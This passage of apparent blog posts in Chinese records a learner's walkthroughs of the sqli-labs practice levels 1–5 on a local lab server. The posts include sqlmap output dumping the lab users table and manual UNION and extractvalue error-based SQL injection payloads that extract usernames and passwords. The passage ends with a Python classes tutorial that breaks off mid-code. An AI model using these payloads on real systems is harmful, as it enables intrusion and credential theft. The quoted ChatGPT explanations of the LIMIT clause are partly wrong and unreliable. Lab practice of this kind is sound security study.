disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 19:31:55 /2023-04-23/</span><br><span class="line"></span><br><span class="line">[19:31:55] [INFO] resuming back-end DBMS &#x27;mysql&#x27;</span><br><span class="line">[19:31:55] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)</span><br><span class="line">    Payload: id=1&quot; AND 3744=3744#</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: id=1&quot; AND GTID_SUBSET(CONCAT(0x7176626a71,(SELECT (ELT(7253=7253,1))),0x716a717171),7253)-- vAnE</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=1&quot; AND (SELECT 4714 FROM (SELECT(SLEEP(5)))bfJG)-- Mruu</span><br><span class="line">---</span><br><span class="line">[19:31:55] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web application technology: Apache 2.4.39, PHP 5.5.9</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.6</span><br><span class="line">[19:31:55] [INFO] fetching columns for table &#x27;users&#x27; in database &#x27;security&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;id&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;int(3)&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;username&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;varchar(20)&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;password&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;varchar(20)&#x27;</span><br><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[3 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| id       | int(3)      |</span><br><span class="line">| password | varchar(20) |</span><br><span class="line">| username | varchar(20) |</span><br><span class="line">+----------+-------------+</span><br><span class="line"></span><br><span class="line">[19:31:55] [INFO] fetching columns for table &#x27;users&#x27; in database &#x27;security&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;id&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;int(3)&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;username&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;varchar(20)&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;password&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;varchar(20)&#x27;</span><br><span class="line">[19:31:55] [INFO] fetching entries for table &#x27;users&#x27; in database &#x27;security&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;1&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;Dumb&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;Dumb&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;2&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;I-kill-you&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;Angelina&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;3&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;p@ssword&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;Dummy&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;4&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;crappy&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;secure&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;5&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;stupidity&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;stupid&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;6&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;genious&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;superman&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;7&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;mob!le&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;batman&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;8&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;admin&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;admin&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;9&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;admin1&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;admin1&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;10&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;admin2&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;admin2&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;11&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;admin3&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;admin3&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;12&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;dumbo&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;dhakkan&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;14&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;admin4&#x27;</span><br><span class="line">[19:31:55] [INFO] resumed: &#x27;admin4&#x27;</span><br><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| id | password   | username |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| 1  | Dumb       | Dumb     |</span><br><span class="line">| 2  | I-kill-you | Angelina |</span><br><span class="line">| 3  | p@ssword   | Dummy    |</span><br><span class="line">| 4  | crappy     | secure   |</span><br><span class="line">| 5  | stupidity  | stupid   |</span><br><span class="line">| 6  | genious    | superman |</span><br><span class="line">| 7  | mob!le     | batman   |</span><br><span class="line">| 8  | admin      | admin    |</span><br><span class="line">| 9  | admin1     | admin1   |</span><br><span class="line">| 10 | admin2     | admin2   |</span><br><span class="line">| 11 | admin3     | admin3   |</span><br><span class="line">| 12 | dumbo      | dhakkan  |</span><br><span class="line">| 14 | admin4     | admin4   |</span><br><span class="line">+----+------------+----------+</span><br><span class="line"></span><br><span class="line">[19:31:55] [INFO] table &#x27;security.users&#x27; dumped to CSV file &#x27;C:\Users\86138\AppData\Local\sqlmap\output\127.0.0.2\dump\security\users.csv&#x27;</span><br><span class="line">[19:31:55] [INFO] fetched data logged to text files under &#x27;C:\Users\86138\AppData\Local\sqlmap\output\127.0.0.2&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 19:31:55 /2023-04-23/</span><br></pre></td></tr></table></figure><p>获取users表下的信息</p><h2 id="sqllibs的前面9道题是一样的套路"><a href="#sqllibs的前面9道题是一样的套路" class="headerlink" title="sqllibs的前面9道题是一样的套路"></a>sqllibs的前面9道题是一样的套路</h2>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqllibs-5</title>
      <link href="/2023/04/20/sqllibs5/"/>
      <url>/2023/04/20/sqllibs5/</url>
      
        <content type="html"><![CDATA[<p>第五题和前面几道题明确有不同</p><p>第四题源码（只截取了后半部分）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;;</span><br><span class="line">  echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-4.jpg&quot; /&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>第五题源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">  echo &#x27;You are in...........&#x27;;</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;</span><br><span class="line">echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-5.jpg&quot; /&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>可见，在if（%row）里面</p><p>第五题的没有第四题的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];</span><br></pre></td></tr></table></figure><p>只有一句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;You are in...........&#x27;;</span><br></pre></td></tr></table></figure><p>所以可见第五题是没回显的</p><p>这样的话我们就可以使用报错注入</p><h3 id="第一种，（一）、extractvalue报错注入"><a href="#第一种，（一）、extractvalue报错注入" class="headerlink" title="第一种，（一）、extractvalue报错注入"></a>第一种，（一）、extractvalue报错注入</h3><p>首先，extractvalue函数的基本格式是</p><p>ExtractValue(xml_frag, xpath_expr)</p><p>简单来说，第一个就是上传一个xml文档，然后用xpath路径法查找路径</p><p>所以这道题上来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;  and (extractvalue(1,concat(&#x27;~&#x27;,database())))--+</span><br></pre></td></tr></table></figure><p>这里面extractvalue里面是1是为因为这里的节点路径是1，表示根节点。第二个函数表示要连接的字符串，这里是~和database（）函数的结果。</p><p>然后继续输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema = &#x27;security&#x27;)))) --+</span><br></pre></td></tr></table></figure><p>回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~emails,referers,uagents,users&#x27;</span><br></pre></td></tr></table></figure><p>证明里面有emails,referers,uagents,users四个库</p><p>下一步直接跟之前一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1’and (extractvalue(1,concat(‘~’,(select group_concat(column_name) from information_schema.columns where table_schema = ‘security’ and table_name = ‘users’)))) --+</span><br></pre></td></tr></table></figure><p>查看列名</p><p>最后就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (extractvalue(1,concat(&#x27;~&#x27;,(select concat(username,password) from security.users limit 0,1)))) --+</span><br></pre></td></tr></table></figure><p>炸出了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~DumbDumb&#x27;</span><br></pre></td></tr></table></figure><p>为什么是limit0,1)</p><p>chatgpt是这么说的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">这段代码是一种SQL注入攻击的尝试，它试图从名为security.users的数据库表中获取第一个用户的用户名和密码。在SQL查询中，LIMIT 0,1的作用是限制结果集的行数，其中0表示从第0行开始，1表示只返回一行结果。</span><br><span class="line"></span><br><span class="line">因此，这个代码尝试从security.users表中获取第一个用户的用户名和密码，然后将它们连接在一起，用波浪号（~）分隔，然后将这个字符串作为参数传递给extractvalue函数，从而执行SQL注入攻击。</span><br><span class="line">实际上，这段代码中的LIMIT子句的语法是不正确的。在标准的SQL语法中，LIMIT子句应该采用以下形式之一：</span><br><span class="line"></span><br><span class="line">LIMIT &lt;count&gt;：返回前count行结果。</span><br><span class="line">LIMIT &lt;offset&gt;, &lt;count&gt;：从偏移量为offset的行开始，返回count行结果。</span><br><span class="line">在这种情况下，LIMIT 0,1的意思是从第一行开始，只返回一行结果。但是，由于语法错误，这个LIMIT子句实际上可能无法正常工作，具体取决于具体的数据库系统。</span><br><span class="line"></span><br><span class="line">在任何情况下，这段代码是恶意的，目的是进行SQL注入攻击，因此应该避免在生产环境中使用它。</span><br></pre></td></tr></table></figure><p>所以我感觉是不是可以不用)直接limit 0,1</p><p>浅浅的试了一下，加成limit(0,1)和limit 0,1都不行</p><p>奇怪的语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在这个SQL注入攻击的语句中，右括号 ) 的作用是结束 LIMIT 子句。这是因为在这个攻击中，攻击者试图向查询中注入一个新的 SQL 子句，以此来控制查询的行为。在这种情况下，攻击者通过在注入语句的结尾添加一个右括号来关闭 LIMIT 子句。</span><br><span class="line"></span><br><span class="line">具体来说，攻击者使用 -- 注释符来注释掉原始查询语句中 WHERE 子句之后的所有内容，然后在注释后添加自己的恶意查询语句。通过在恶意查询语句的末尾添加一个右括号来关闭 LIMIT 子句，攻击者就可以确保他们注入的新子句不会与原始查询语句产生语法冲突。</span><br></pre></td></tr></table></figure><p>很好，懂了</p><h1 id="（这里因为我懒就只用了第一种，等哪天再来填坑）"><a href="#（这里因为我懒就只用了第一种，等哪天再来填坑）" class="headerlink" title="（这里因为我懒就只用了第一种，等哪天再来填坑）"></a>（这里因为我懒就只用了第一种，等哪天再来填坑）</h1>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqllibs1-4</title>
      <link href="/2023/04/20/sqllibs/"/>
      <url>/2023/04/20/sqllibs/</url>
      
        <content type="html"><![CDATA[<p>个人感觉sqllibs的前面4道题大差不差</p><p>第一题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><p>这个注入只需要构造?id=1’就可以了</p><p>第二题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($resul</span><br></pre></td></tr></table></figure><p>这个直接?id=1就可以了</p><p>第三题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><p>这个加？id=1’)</p><p>第四题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><p>这里有一点点不一样的是前面加了两个</p><p>$id=’”‘$id=’”‘</p><p>所以我们也要这样</p><p>?id=1”)</p><p>不过为什么都是只加一半？这个等我以后再说吧</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqllibs注入第一关</title>
      <link href="/2023/04/20/sqllibs1/"/>
      <url>/2023/04/20/sqllibs1/</url>
      
        <content type="html"><![CDATA[<h5 id="纪念第一次手动注入"><a href="#纪念第一次手动注入" class="headerlink" title="纪念第一次手动注入"></a>纪念第一次手动注入</h5><p>上来先是输入</p><p>?id=1寻找注入点，（这道题的注入点就是?id=1）</p><p>后面就可以开始注入了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.2:777/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure><p>提示的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p>有语法错误，这里可能有漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.2:777/Less-1/?id=1&#x27;--+</span><br></pre></td></tr></table></figure><p>正常回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure><p>用order by判断这条语句有几列数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;order by 3--+</span><br></pre></td></tr></table></figure><p>在这个地方，输入3的时候正常回显，输入4的时候提示出错，所以判断有3列</p><p>于是使用函数查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=888(这里随便输入一个数据库不存在的数就行)&#x27;union selec ct 1,2,3--+</span><br></pre></td></tr></table></figure><p>回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:2</span><br><span class="line">Your Password:3 </span><br></pre></td></tr></table></figure><p>如图可见显示位为2,3位</p><p>查询数据库名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id=888’ union select 1,2,database() --+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:2</span><br><span class="line">Your Password:security</span><br></pre></td></tr></table></figure><p>继续查看表明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=888&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:2</span><br><span class="line">Your Password:emails,referers,uagents,users</span><br></pre></td></tr></table></figure><p>显然表中有个users，查看即可得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=888&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema = &#x27;security&#x27; and table_name = &#x27;users&#x27;--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:2</span><br><span class="line">Your Password:id,username,password</span><br></pre></td></tr></table></figure><p>里面有password和username</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=888&#x27; union select 1,group_concat(username),group_concat(password) from security.users--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/20/u23gaADy1ke4LQb.jpg" alt="7162B3F1A3ECE2BBBA8B6D1FA21423D8.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python--从入门到入土--类</title>
      <link href="/2023/03/29/Python--%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F---%E7%B1%BB/"/>
      <url>/2023/03/29/Python--%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F---%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<p>类</p><h5 id="创建和使用类以及根据实参来创造事例"><a href="#创建和使用类以及根据实参来创造事例" class="headerlink" title="创建和使用类以及根据实参来创造事例"></a>创建和使用类以及根据实参来创造事例</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class Dog:</span><br><span class="line">    def __init__(self,name,age):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    def sit(self):</span><br><span class="line">        print(f&quot;&#123;self.name&#125; is now sitting &quot;)</span><br><span class="line"></span><br><span class="line">    def roll_over(self):</span><br><span class="line">        print(f&quot;&#123;self.name&#125; rolled over&quot;)</span><br><span class="line"></span><br><span class="line">my_dog = Dog(&quot;willie&quot;,6)</span><br><span class="line">print(f&quot;my dog&#x27;s name is  &#123;my_dog.name&#125;&quot;)</span><br><span class="line">print(f&quot;my dog&#x27;s age is &#123;my_dog.age&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my dog&#x27;s name is  willie</span><br><span class="line">my dog&#x27;s age is 6</span><br></pre></td></tr></table></figure><p>这里的”_init_（）“是一种特殊的方法，每当你想要根据Dog类创建新的实例的时候，Python就会自动运行它。在这个方法的名称中，开头和结尾默认都有2个下划线，这是为了避免Python将他和其他的普通的方法名称发生冲突。在这个方法的定义的时候，形参self是必不可少的，而且必须为与其他的形参的前面。因为Python在调用这个函数的时候，将会自动传入实参self，每个与实例相关联的方法调用都自动传递实参self，它起到一个指向实例的作用，让实例能够访问类中的属性和方法。后面的def中变量都有前缀self，以self为前缀的变量可供给类中的所有方法使用，可以通过类的所有实例来访问。可通过实例访问的变量称之为属性。</p><p>Dog类还定义了来年各个方法：sit()和roll_over。这些方法执行时不需要额外的信息，因此他们只有一个形参self、</p><h6 id="1-访问属性"><a href="#1-访问属性" class="headerlink" title="1.访问属性"></a>1.访问属性</h6><p>my_dog.name</p><h6 id="2-调用方法"><a href="#2-调用方法" class="headerlink" title="2.调用方法"></a>2.调用方法</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class Dog:</span><br><span class="line">    def __init__(self,name,age):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    def sit(self):</span><br><span class="line">        print(f&quot;&#123;self.name&#125; is now sitting &quot;)</span><br><span class="line"></span><br><span class="line">    def roll_over(self):</span><br><span class="line">        print(f&quot;&#123;self.name&#125; rolled over&quot;)</span><br><span class="line"></span><br><span class="line">my_dog = Dog(&quot;willie&quot;,6)</span><br><span class="line">print(f&quot;my dog&#x27;s name is  &#123;my_dog.name&#125;&quot;)</span><br><span class="line">print(f&quot;my dog&#x27;s age is &#123;my_dog.age&#125;&quot;)</span><br><span class="line">my_dog.sit()</span><br><span class="line">my_dog.roll_over()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my dog&#x27;s name is  willie</span><br><span class="line">my dog&#x27;s age is 6</span><br><span class="line">willie is now sitting </span><br><span class="line">willie rolled over</span><br></pre></td></tr></table></figure><h6 id="3-创造多个实例"><a href="#3-创造多个实例" class="headerlink" title="3.创造多个实例"></a>3.创造多个实例</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 